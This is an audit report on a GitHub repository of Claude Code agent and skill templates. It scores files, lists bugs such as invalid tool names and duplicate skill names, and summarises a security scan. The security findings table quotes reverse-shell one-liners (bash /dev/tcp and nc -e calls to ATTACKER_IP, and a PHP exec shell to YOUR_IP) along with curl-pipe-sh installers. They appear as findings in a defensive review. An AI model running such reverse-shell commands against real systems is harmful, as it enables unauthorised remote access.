# Audit: davila7/claude-code-templates

**NL Score**: 84/100 &nbsp;&nbsp; **Security**: REVIEW  
**Repo**: https://github.com/davila7/claude-code-templates  
**Audited**: 2026-04-19  
**Artifacts**: ~100 (agents + skills)  
**Risk Level**: CRITICAL (pre-scan flag; findings are in educational security skills)

---

## NL Score Summary

| File | Type | Score | Primary Issues |
|------|------|-------|----------------|
| `cli-tool/components/agents/devops/deploy-assistant/AGENT.md` | agent | 52 | Invalid tools: `codebase`, `editFiles`, `runCommands`, `terminalCommand` (VS Code Copilot) |
| `cli-tool/components/agents/devops/ci-cd-agent/AGENT.md` | agent | 52 | Invalid tools: `codebase`, `editFiles`, `runCommands`, `terminalCommand` (VS Code Copilot) |
| `cli-tool/components/agents/devops/infrastructure-agent/AGENT.md` | agent | 52 | Invalid tools: `codebase`, `editFiles`, `runCommands`, `terminalCommand` (VS Code Copilot) |
| `cli-tool/components/agents/devops/security-agent/AGENT.md` | agent | 52 | Invalid tools: `codebase`, `editFiles`, `runCommands`, `terminalCommand` (VS Code Copilot) |
| `cli-tool/components/agents/devops/monitoring-agent/AGENT.md` | agent | 52 | Invalid tools: `codebase`, `editFiles`, `runCommands`, `terminalCommand` (VS Code Copilot) |
| `cli-tool/components/agents/devops/release-manager/AGENT.md` | agent | 52 | Invalid tools: `codebase`, `editFiles`, `runCommands`, `terminalCommand` (VS Code Copilot) |
| `cli-tool/components/skills/business-marketing/brand-guidelines-community/SKILL.md` | skill | 75 | `name: brand-guidelines` — duplicate name conflict with brand-guidelines-anthropic |
| `cli-tool/components/skills/business-marketing/brand-guidelines-anthropic/SKILL.md` | skill | 75 | `name: brand-guidelines` — duplicate name conflict with brand-guidelines-community |
| `cli-tool/components/skills/business-marketing/ai-product/SKILL.md` | skill | 82 | Sharp Edges solutions are bare code comments with no actual content |
| `cli-tool/components/skills/business-marketing/ai-wrapper-product/SKILL.md` | skill | 83 | Patterns section has headers but no pattern content |
| `cli-tool/components/skills/business-marketing/ceo-advisor/SKILL.md` | skill | 85 | Non-standard frontmatter: `license`, nested `metadata` block; unverified script references |
| `cli-tool/components/skills/business-marketing/cto-advisor/SKILL.md` | skill | 85 | Non-standard frontmatter: `license`, nested `metadata` block; unverified script references |
| `cli-tool/components/skills/business-marketing/marketing-strategy-pmm/SKILL.md` | skill | 85 | Non-standard frontmatter; references unverified scripts/assets |
| `cli-tool/components/skills/business-marketing/marketing-demand-acquisition/SKILL.md` | skill | 85 | Non-standard frontmatter pattern |
| `cli-tool/components/skills/workflow-automation/zapier-make-patterns/SKILL.md` | skill | 85 | Sharp Edges solutions column: only comments, no actual content; description truncated |
| `cli-tool/components/skills/business-marketing/viral-generator-builder/SKILL.md` | skill | 87 | Non-standard `source` field; Sharp Edges partially empty |
| `cli-tool/components/skills/business-marketing/micro-saas-launcher/SKILL.md` | skill | 87 | Non-standard `source` field; code patterns inside JS comments |
| `cli-tool/components/skills/business-marketing/product-manager-toolkit/SKILL.md` | skill | 88 | References `rice_prioritizer.py`, `customer_interview_analyzer.py` — not verified to exist |
| `cli-tool/components/skills/business-marketing/product-strategist/SKILL.md` | skill | 88 | References `scripts/okr_cascade_generator.py` — not verified to exist |
| `cli-tool/components/skills/business-marketing/agile-product-owner/SKILL.md` | skill | 88 | References `scripts/user_story_generator.py` — not verified to exist |
| `cli-tool/components/skills/media/transcribe/SKILL.md` | skill | 88 | Non-standard `author: openai` field; references `transcribe_diarize.py` |
| `cli-tool/components/skills/media/video-downloader/SKILL.md` | skill | 88 | Clean; minor: no model field |
| `cli-tool/components/skills/media/speech/SKILL.md` | skill | 88 | Non-standard `author: openai` field; references `scripts/text_to_speech.py` |
| `cli-tool/components/skills/business-marketing/launch-strategy/SKILL.md` | skill | 92 | Clean |
| `cli-tool/components/skills/business-marketing/marketing-ideas/SKILL.md` | skill | 92 | Clean |
| `cli-tool/components/skills/business-marketing/page-cro/SKILL.md` | skill | 92 | Clean |
| `cli-tool/components/skills/business-marketing/free-tool-strategy/SKILL.md` | skill | 92 | Clean |
| `cli-tool/components/skills/business-marketing/popup-cro/SKILL.md` | skill | 92 | Clean |
| `cli-tool/components/skills/business-marketing/competitor-alternatives/SKILL.md` | skill | 90 | Clean |
| `cli-tool/components/skills/business-marketing/x-twitter-scraper/SKILL.md` | skill | 93 | Clean |
| `cli-tool/components/skills/business-marketing/content-research-writer/SKILL.md` | skill | 94 | Clean |
| `cli-tool/components/skills/business-marketing/schema-markup/SKILL.md` | skill | 93 | Clean |
| `cli-tool/components/skills/business-marketing/lead-research-assistant/SKILL.md` | skill | 93 | Clean |
| `cli-tool/components/skills/business-marketing/seo-audit/SKILL.md` | skill | 93 | Clean |
| `cli-tool/components/skills/business-marketing/ab-test-setup/SKILL.md` | skill | 93 | Clean |
| `cli-tool/components/skills/business-marketing/marketing-psychology/SKILL.md` | skill | 93 | Clean |
| `cli-tool/components/skills/business-marketing/analytics-tracking/SKILL.md` | skill | 93 | Clean |
| `cli-tool/components/skills/business-marketing/social-content/SKILL.md` | skill | 93 | Clean |
| `cli-tool/components/skills/business-marketing/pricing-strategy/SKILL.md` | skill | 93 | Clean |
| `cli-tool/components/skills/business-marketing/onboarding-cro/SKILL.md` | skill | 93 | Clean |
| `cli-tool/components/skills/business-marketing/signup-flow-cro/SKILL.md` | skill | 93 | Clean |
| `cli-tool/components/skills/business-marketing/paywall-upgrade-cro/SKILL.md` | skill | 93 | Clean |
| `cli-tool/components/skills/business-marketing/paid-ads/SKILL.md` | skill | 93 | Clean |

**Weighted Average**: 84/100 (agents drag down overall; skills average ~90)

---

## Security Scan

**Risk Level**: CRITICAL (pre-scan flag)  
**Verdict**: REVIEW — all critical findings are in explicitly labeled pentesting/security educational skills

| Surface | Count |
|---------|-------|
| Hook files | 0 |
| Script files | 1079 |
| MCP config files | 7 |
| Critical pattern matches | 3 |
| High pattern matches | 3 |

### Security Findings

| Severity | File | Line | Pattern | Notes |
|----------|------|------|---------|-------|
| CRITICAL | `cli-tool/components/skills/security/linux-privilege-escalation/SKILL.md` | 144 | `curl -L .../linpeas.sh \| sh` | Unsigned curl-pipe-sh in educational pentesting skill |
| CRITICAL | `cli-tool/components/skills/security/linux-privilege-escalation/SKILL.md` | 354–419 | `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` (×3), `nc -e /bin/bash ATTACKER_IP 4444`, Perl socket shell | Reverse shell payloads — placeholder IPs (`ATTACKER_IP`) confirm educational context |
| CRITICAL | `cli-tool/components/skills/security/wordpress-penetration-testing/SKILL.md` | 313 | `exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'")` | PHP reverse shell — placeholder IP confirms educational context |
| HIGH | `cli-tool/components/agents/expert-advisors/droid.md` | 21, 238 | `curl -fsSL https://app.factory.ai/cli \| sh` | Unsigned third-party installer in a general-purpose agent — not an educational security skill |
| HIGH | `cli-tool/components/skills/security/cloud-penetration-testing/SKILL.md` | 29 | `curl https://sdk.cloud.google.com \| bash` | Legitimate GCP SDK but unsigned curl-pipe-bash |
| HIGH | Multiple skills | various | `subprocess.shell=True`, `os.system()` | In educational/automation skills; context-appropriate |

**Assessment**: The 3 CRITICAL findings are in skills explicitly scoped to penetration testing with placeholder IPs (`ATTACKER_IP`, `YOUR_IP`), consistent with educational offensive security content. The HIGH finding in `droid.md` is more concerning — an unsigned curl-pipe-sh installer from a third-party domain (`app.factory.ai`) appearing in a general-purpose agent that users may run without a pentesting context.

---

## Bugs

Bugs are mechanical defects that cause incorrect behavior or install failures. Each warrants a fix before publication.

| # | File | Bug | Impact |
|---|------|-----|--------|
| B1 | `cli-tool/components/agents/devops/deploy-assistant/AGENT.md` | `tools` lists VS Code Copilot names (`codebase`, `editFiles`, `runCommands`, `terminalCommand`) — invalid in Claude Code | Agent silently receives no tools at runtime |
| B2 | `cli-tool/components/agents/devops/ci-cd-agent/AGENT.md` | Same VS Code Copilot tool names | Agent silently receives no tools at runtime |
| B3 | `cli-tool/components/agents/devops/infrastructure-agent/AGENT.md` | Same VS Code Copilot tool names | Agent silently receives no tools at runtime |
| B4 | `cli-tool/components/agents/devops/security-agent/AGENT.md` | Same VS Code Copilot tool names | Agent silently receives no tools at runtime |
| B5 | `cli-tool/components/agents/devops/monitoring-agent/AGENT.md` | Same VS Code Copilot tool names | Agent silently receives no tools at runtime |
| B6 | `cli-tool/components/agents/devops/release-manager/AGENT.md` | Same VS Code Copilot tool names | Agent silently receives no tools at runtime |
| B7 | `cli-tool/components/skills/business-marketing/brand-guidelines-community/SKILL.md` | `name: brand-guidelines` — identical to brand-guidelines-anthropic | Silent overwrite on install; one skill clobbers the other |
| B8 | `cli-tool/components/skills/business-marketing/brand-guidelines-anthropic/SKILL.md` | `name: brand-guidelines` — identical to brand-guidelines-community | Silent overwrite on install; one skill clobbers the other |
| B9 | `cli-tool/components/agents/expert-advisors/droid.md` | `curl -fsSL https://app.factory.ai/cli \| sh` unsigned third-party installer in agent body | Arbitrary code execution from external domain when agent runs |

**Valid Claude Code tool names for reference**: `Read`, `Write`, `Edit`, `MultiEdit`, `Bash`, `Glob`, `Grep`, `WebSearch`, `WebFetch`, `Agent`, `Task`, `TodoWrite`

---

## Security Fixes

| # | File | Finding | Fix |
|---|------|---------|-----|
| SF1 | `cli-tool/components/agents/expert-advisors/droid.md` | `curl -fsSL https://app.factory.ai/cli \| sh` at lines 21 and 238 | Add explicit user-facing warning block: "This installs from a third-party domain. Verify the script before running." Or replace with pinned hash verification pattern. |
| SF2 | `cli-tool/components/skills/security/linux-privilege-escalation/SKILL.md` | `curl \| sh` at line 144 | Add security disclaimer header noting this is for authorized lab environments only |
| SF3 | `cli-tool/components/skills/security/wordpress-penetration-testing/SKILL.md` | PHP reverse shell at line 313 | Already in pentesting context; add ⚠️ disclaimer to code block confirming authorized-use-only scope |

---

## Quality Issues

Non-breaking issues that reduce reliability or user experience.

| # | File | Issue | Severity |
|---|------|-------|----------|
| Q1 | `cli-tool/components/skills/business-marketing/ai-product/SKILL.md` | Sharp Edges "Solution" column contains only bare code comments (`# Always validate output:`, `# Defense layers:`) with no actual content | Medium |
| Q2 | `cli-tool/components/skills/workflow-automation/zapier-make-patterns/SKILL.md` | Sharp Edges "Solution" column: all cells contain only `# ALWAYS use dropdowns...`, `# Prevention:` etc. — stub placeholders, not solutions | Medium |
| Q3 | `cli-tool/components/skills/business-marketing/ai-wrapper-product/SKILL.md` | Patterns section has section headers (`### Basic`, `### Advanced`) but no content under them | Medium |
| Q4 | `cli-tool/components/skills/business-marketing/ceo-advisor/SKILL.md` | Non-standard frontmatter: `license: MIT` + nested `metadata:` block with `version`, `author`, `category`, `domain`, `updated`, `python-tools`, `frameworks` — Claude Code ignores all these fields | Low |
| Q5 | `cli-tool/components/skills/business-marketing/cto-advisor/SKILL.md` | Same non-standard frontmatter pattern as ceo-advisor | Low |
| Q6 | `cli-tool/components/skills/business-marketing/marketing-strategy-pmm/SKILL.md` | Same non-standard frontmatter pattern; references `assets/sales-deck-template.pptx` — binary asset bundling is unconventional for skills | Low |
| Q7 | `cli-tool/components/skills/business-marketing/marketing-demand-acquisition/SKILL.md` | Same non-standard frontmatter pattern | Low |
| Q8 | `cli-tool/components/skills/media/transcribe/SKILL.md` | `author: openai` — misleading; skill was authored for this repo, not by OpenAI | Low |
| Q9 | `cli-tool/components/skills/media/speech/SKILL.md` | `author: openai` — same misleading attribution | Low |
| Q10 | `cli-tool/components/skills/business-marketing/product-manager-toolkit/SKILL.md` | References `rice_prioritizer.py` and `customer_interview_analyzer.py` — scripts not present in repo | Low |
| Q11 | `cli-tool/components/skills/business-marketing/product-strategist/SKILL.md` | References `scripts/okr_cascade_generator.py` — not present in repo | Low |
| Q12 | `cli-tool/components/skills/business-marketing/agile-product-owner/SKILL.md` | References `scripts/user_story_generator.py` — not present in repo | Low |
| Q13 | Multiple `vibeship-spawner-skills` skills | Non-standard `source: vibeship-spawner-skills (Apache 2.0)` frontmatter field — Claude Code ignores this; license info belongs in repo root LICENSE file | Low |
| Q14 | `cli-tool/components/skills/workflow-automation/zapier-make-patterns/SKILL.md` | `description` frontmatter field truncated mid-sentence ("...when to graduate to code-based solutions. Key insight: Zapier optimizes for simplicity and integrations (7000+ apps), Make optimizes for power ") | Low |

---

## Cross-Component

### 1. VS Code Copilot Agent Cluster (B1–B6)

All 6 devops agents under `cli-tool/components/agents/devops/` share the same bug: their `tools` arrays contain VS Code Copilot tool names (`codebase`, `edit`/`editFiles`, `runCommands`, `terminalCommand`, `search`, `githubRepo`) which are invalid in Claude Code. This is a wholesale copy-paste from GitHub Copilot agent definitions without adaptation. The fix is identical across all 6 files: replace with valid Claude Code tools (`Bash`, `Read`, `Write`, `Edit`, `Glob`, `Grep`).

### 2. Duplicate Skill Name: `brand-guidelines` (B7–B8)

`brand-guidelines-community/SKILL.md` and `brand-guidelines-anthropic/SKILL.md` both declare `name: brand-guidelines`. In Claude Code's skill registry, names are the install key — the second install silently overwrites the first. The files appear to contain different content (community guidelines vs. Anthropic brand guidelines) so the duplication is unintentional. One must be renamed to `brand-guidelines-anthropic`.

### 3. Unverified Script References (Q10–Q12)

Seven skills reference Python scripts (`rice_prioritizer.py`, `customer_interview_analyzer.py`, `okr_cascade_generator.py`, `user_story_generator.py`, `strategy_analyzer.py`, `financial_scenario_analyzer.py`, `tech_debt_analyzer.py`) that are referenced as if bundled with the skill but were not found in the repo. Users who follow skill instructions will encounter missing-file errors. Either the scripts should be added or the references removed.

### 4. Security Skills and Offensive Payload Co-location

The security skill category (`skills/security/`) contains both defensive posture skills and explicit offensive pentesting skills with live payload examples (reverse shells, privilege escalation chains). This is architecturally sound for a pentesting toolkit but creates a CRITICAL pre-scan flag for any automated pipeline that processes this repo. Consider adding a `SECURITY-EDUCATION.md` disclaimer at the category root, or tagging these skills with `audience: security-professional` to allow automated scanners to suppress false positives.

---

## Recommendation

**Verdict: CONDITIONAL APPROVE** — Fix bugs B1–B9 before publishing.

The `davila7/claude-code-templates` repository contains a substantial library of high-quality marketing, business, and media skills (averaging ~91/100) that demonstrate strong Claude Code conventions. The main issues are mechanical: six devops agents were copied from VS Code Copilot definitions without adapting tool names, and two brand-guidelines skills have an identical `name` field that will cause a silent install conflict. The security scan's CRITICAL flag resolves on inspection — all reverse shell payloads appear in explicitly scoped penetration testing educational skills with placeholder IPs, which is appropriate for that context. The one actionable security fix is in `droid.md`, which embeds an unsigned third-party curl-pipe-sh installer (`app.factory.ai`) in a general-purpose agent without a user-facing warning. Priority order: fix the 6 devops agent tool names (B1–B6), rename one `brand-guidelines` skill (B7/B8), add a security disclaimer to `droid.md` (B9/SF1), then verify or remove the seven missing script references (Q10–Q12). After those fixes this repo would score ~91/100 and be safe to distribute.
